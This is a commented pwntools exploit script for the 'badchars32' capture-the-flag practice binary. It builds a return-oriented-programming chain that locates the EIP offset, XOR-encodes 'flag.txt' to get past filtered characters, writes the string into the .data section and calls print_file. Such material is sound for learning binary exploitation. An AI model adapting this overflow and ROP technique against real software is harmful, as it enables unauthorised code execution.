from pwn import *
import warnings
warnings.filterwarnings("ignore")

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-gef
break print_file
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './badchars32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

# fine eip
def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip, alphabet='bcdefhijk') # generate payload with non bad characters 'x', 'g', 'a', '.'
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100, alphabet='bcdefhijk'))
io = start()
info(io.recvline_contains('badchars are'))

# Address of .data section (size=8 bytes) and print_file function, use rabin2 or gdb to find
# gdb - info file
# rabin2 - rabin -S BINARY not .so file
data_section_address = 0x0804a018
print_file = 0x80483d0

# Use ropper to obtain gadgets
pop_esi_pop_edi_pop_ebp = 0x080485b9
pop_ebx_pop_esi_pop_edi_pop_ebp = 0x080485b8
mov_edi_esi = 0x0804854f
xor_ebp_bl = 0x08048547 # Meaning of bl https://stackoverflow.com/questions/34380974/what-does-mov-bl-do-in-assembly
pop_ebp = 0x080485bb
pop_ebx = 0x0804839d

# Print out important addresses
info("%#x data_section_address", data_section_address)
info("%#x pop_esi_pop_edi_pop_ebp", pop_esi_pop_edi_pop_ebp)
info("%#x print_file", print_file)

# Since badchars are 'x', 'g', 'a', '.' and are all contained in flag.txt, we need to XOR before storing in memory
value_to_xor_with = 2
xored_string = xor('flag.txt', value_to_xor_with)
info("flag.txt XORd with %d: %s", value_to_xor_with, xored_string)

# To test bad characters, we can fuzz the binary with every possible character and observe EIP on crash
# badchars = bytes(range(256))
# print(str(badchars))

# To reverse the xor() we did with flag.txt, we can run xor on every character of the string as our xor instruction only takes in 1 byte (8 bits) from the current address
xor_exploit = b""
data_addr_offset = 0
value_to_xor_with = 2
for c in xored_string:
    xor_exploit += pack(pop_ebp)
    xor_exploit += pack(data_section_address + data_addr_offset)
    xor_exploit += pack(pop_ebx)
    xor_exploit += pack(value_to_xor_with)
    xor_exploit += pack(xor_ebp_bl)
    data_addr_offset+=1

# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
# flag.txt takes up 64 bit (8 chars, each char uses 2 hexadcimals, each hexadecimal uses 4 bits), hence split into 2 memory sections
payload = flat(
    asm('nop') * eip_offset,  
    pop_esi_pop_edi_pop_ebp,
    xored_string[:4],
    data_section_address,
    0x0,  # 3 - The instruction also pops ebp (not needed) so just send this empty value
    mov_edi_esi, 

    pop_esi_pop_edi_pop_ebp,
    xored_string[4:], 
    data_section_address + 0x4,
    0x0,  # 3 - The instruction also pops ebp (not needed) so just send this empty value
    mov_edi_esi,

    xor_exploit,
    
    print_file, # Next address is the return address and the following address is the string (similar to system()). Function arguments found on stack for 32 bit architecture
    0x0,
    data_section_address
)

# flag.txt takes up 64 bit (8 chars, each char uses 2 hexadcimals, each hexadecimal uses 4 bits), hence split into 2 memory sections
payload = flat(
    asm('nop') * eip_offset,  
    pop_ebx_pop_esi_pop_edi_pop_ebp,
    0x0,
    xored_string[:4],
    data_section_address,
    0x0,
    mov_edi_esi, 

    pop_ebx_pop_esi_pop_edi_pop_ebp,
    0x0,
    xored_string[4:], 
    data_section_address + 0x4,
    0x0,
    mov_edi_esi,

    xor_exploit,
    
    print_file,
    0x0,
    data_section_address
)

write("payload", payload)

# Send the payload to a new copy of the process
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
